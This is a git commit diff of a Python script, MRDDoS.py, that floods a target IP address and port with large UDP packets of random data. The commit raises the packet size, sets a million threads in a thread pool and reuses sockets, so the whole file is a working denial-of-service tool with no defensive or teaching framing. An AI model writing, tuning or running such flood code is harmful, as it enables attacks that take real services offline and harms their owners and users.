a6d99f9a13c5a8581026d1ac996322e974c7f9e9
𝗸𝗮𝗹𝗶@𝘄𝗼𝗼𝘀𝗲𝗿𝗿 <118610046+wooserr@users.noreply.github.com>
2025-01-04 14:14:30 +0300

    MRDDoS.py

--- MRDDoS.py
+++ MRDDoS.py
@@ -1,31 +1,42 @@
 import socket
 import threading
 import os
-
+import time
+import concurrent.futures
 
 target_ip = input("Enter the target IP address: ")
-target_port = int(input("Enter the target port number (80 for HTTP): "))
+target_port = int(input("Enter the target port number (e.g., 80 for HTTP): "))
 
 
-payload_size = 1024 * 50
+payload_size = 1024 * 60
 message = os.urandom(payload_size)
 
 
-def attack():
+threads_count = 1000000
+
+
+def create_socket():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1000000)  
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  
+    return sock
+
+
+def attack(sock):
     while True:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         try:
             sock.sendto(message, (target_ip, target_port))
             print(f"Packet sent to {target_ip}:{target_port}")
+            time.sleep(0.01)  
         except socket.error:
             print("Failed to send packet.")
-        finally:
-            sock.close()
 
 
-threads_count = 10000
+def main():
+    with concurrent.futures.ThreadPoolExecutor(max_workers=threads_count) as executor:
+        for _ in range(threads_count):
+            sock = create_socket()
+            executor.submit(attack, sock)
 
-
-for _ in range(threads_count):
-    thread = threading.Thread(target=attack)
-    thread.start()
+if __name__ == "__main__":
+    main()
